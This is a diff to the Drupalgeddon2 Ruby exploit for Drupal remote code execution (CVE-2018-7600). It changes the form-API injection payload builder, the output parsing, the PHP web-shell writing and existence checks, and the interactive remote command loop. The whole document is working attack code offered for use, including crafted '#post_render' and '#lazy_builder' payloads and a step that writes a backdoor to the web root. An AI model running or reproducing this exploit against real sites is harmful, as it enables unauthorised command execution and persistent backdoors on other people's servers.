@@ -1,6 +1,6 @@
 #!/usr/bin/env ruby
 #
-# [CVE-2018-7600] Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' (SA-CORE-2018-002) ~ https://github.com/dreadlocked/Drupalgeddon2/
+# [CVE-2018-7600] Drupal <= 8.5.0 / <= 8.4.5 / <= 8.3.8 / 7.23 <= 7.57 - 'Drupalgeddon2' (SA-CORE-2018-002) ~ https://github.com/dreadlocked/Drupalgeddon2/
 #
 # Authors:
 # - Hans Topo ~ https://github.com/dreadlocked // https://twitter.com/_dreadlocked
@@ -60,8 +60,8 @@ def http_request(url, type="get", payload="")
 end
 
 
-# Function gen_evil_url <cmd> [phpfunction] [shell]
-def gen_evil_url(evil, phpfunction="passthru", shell=false)
+# Function gen_evil_url <cmd> [shell] [phpfunction]
+def gen_evil_url(evil, shell=false, phpfunction="exec") #passthru
   puts info("Payload: #{evil}") if not shell
   puts verbose("PHP fn     : #{phpfunction}") if not shell and $verbose
 
@@ -73,7 +73,7 @@ def gen_evil_url(evil, phpfunction="passthru", shell=false)
     payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpfunction + "&mail[a][#type]=markup&mail[a][#markup]=" + evil
 
     # Method #2 - Drupal v8.x,  timezone, #lazy_builder - response is 500 & blind (will need to disable target check for this to work!)
-    #url = $target + $clean_url + $form + "%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
+    #url = $target + $clean_url + $form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
     #payload = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=" + phpfunction + "&timezone[a][#lazy_builder][][]=" + evil
   elsif $drupalverion.start_with?("7")
     # Method #3 - Drupal v7.x, name, #post_render - response is 200
@@ -105,18 +105,23 @@ end
 # Function clean_result <input>
 def clean_result(input)
   #result = JSON.pretty_generate(JSON[response.body])
-  #result = $drupalverion.start_with?("8")? JSON.parse(input)[0]["data"] : input
-  result = input
+  #result = $drupalverion.start_with?("8")? JSON.parse(clean)[0]["data"] : clean
+  clean = input.to_s.strip
 
   # PHP function: passthru
-  # For: [{"command":"insert","method":"replaceWith","selector":null,"data":"\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
-  #result.slice!(/^\[{"command":".*}\]$/)
-  result.slice!(/\[{"command":".*}\]$/)
+  # For: <payload>[{"command":"insert","method":"replaceWith","selector":null,"data":"\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
+  clean.slice!(/\[{"command":".*}\]$/)
 
+  # PHP function: exec
+  # For: [{"command":"insert","method":"replaceWith","selector":null,"data":"<payload>\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
+  #clean.slice!(/\[{"command":".*data":"/)
+  #clean.slice!(/\\u003Cspan class=\\u0022.*}\]$/)
+
+  # Newer PHP for an older Drupal
   # For: <b>Deprecated</b>:  assert(): Calling assert() with a string argument is deprecated in <b>/var/www/html/core/lib/Drupal/Core/Plugin/DefaultPluginManager.php</b> on line <b>151</b><br />
-  #result.slice!(/<b>.*<br \/>/)
+  #clean.slice!(/<b>.*<br \/>/)
 
-  return result
+  return clean
 end
 
 
@@ -188,7 +193,7 @@ puts action("--==[::#Drupalggedon2::]==--")
 puts "-"*80
 puts info("Target : #{$target}")
 puts info("Proxy  : #{$proxy_addr}:#{$proxy_port}") if $proxy_addr
-puts info("Write? : Skipping writing web shell") if not try_phpshell
+puts info("Write? : Skipping writing PHP web shell") if not try_phpshell
 puts "-"*80
 
 
@@ -375,7 +380,7 @@ if response.code == "200" and not response.body.empty?
       puts verbose("response.body: #{response.body}") if $verbose
     end
   else
-    puts warning("WARNING: Target MIGHT be exploitable [3] (HTTP Response: #{response.code})...   Didn't detect ANY output (disabled PHP function?)")
+    puts warning("WARNING: Target MIGHT be exploitable [3] (HTTP Response: #{response.code})...   Didn't detect any INJECTED output (disabled PHP function?)")
     puts verbose("response.body: #{response.body}") if $verbose
   end
 elsif response.body.empty?
@@ -407,6 +412,21 @@ paths = [
 ]
 # Check all (if doing web shell)
 paths.each do|path|
+  # Check to see if there is already a file there
+  puts action("Testing: Existing file   (#{$target}#{path}#{webshell})")
+  response = http_request("#{$target}#{path}#{webshell}")
+  if response.code == "200"
+    puts warning("Response: HTTP #{response.code} // Size: #{response.size}.   Something could already be there?")
+  else
+    puts info("Response: HTTP #{response.code} // Size: #{response.size}")
+  end
+
+  puts "- "*40
+
+
+  # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+
   folder = path.empty? ? "./" : path
   puts action("Testing: Writing To Web Root   (#{folder})")
 
@@ -415,7 +435,6 @@ paths.each do|path|
 
   # Final command to execute
   cmd = "#{bashcmd} | tee #{webshellpath}"
-
 
   # By default, Drupal v7.x disables the PHP engine using: ./sites/default/files/.htaccess
   # ...however, Drupal v8.x disables the PHP engine using: ./.htaccess
@@ -432,7 +451,7 @@ paths.each do|path|
   if response.code == "200" and not response.body.empty?
     # Feedback
     result = clean_result(response.body)
-    puts success("Result : #{result}") if not response.body.empty?
+    puts success("Result : #{result}") if not result.empty?
 
     # Test to see if backdoor is there (if we managed to write it)
     response = http_request("#{$target}#{webshellpath}", "post", "c=hostname")
@@ -492,6 +511,9 @@ loop do
   # Get input
   command = Readline.readline("#{prompt}>> ", true).to_s
 
+  # Check input
+  puts warning("WARNING: Detected an known bad character (>)") if command =~ />/
+
   # Exit
   break if command == "exit"
 
@@ -504,7 +526,7 @@ loop do
     result = http_request("#{$target}#{webshell}", "post", "c=#{command}").body
   # Direct OS commands
   else
-    url, payload = gen_evil_url(command, "passthru", true)
+    url, payload = gen_evil_url(command, true)
     response = http_request(url, "post", payload)
 
     # Check result
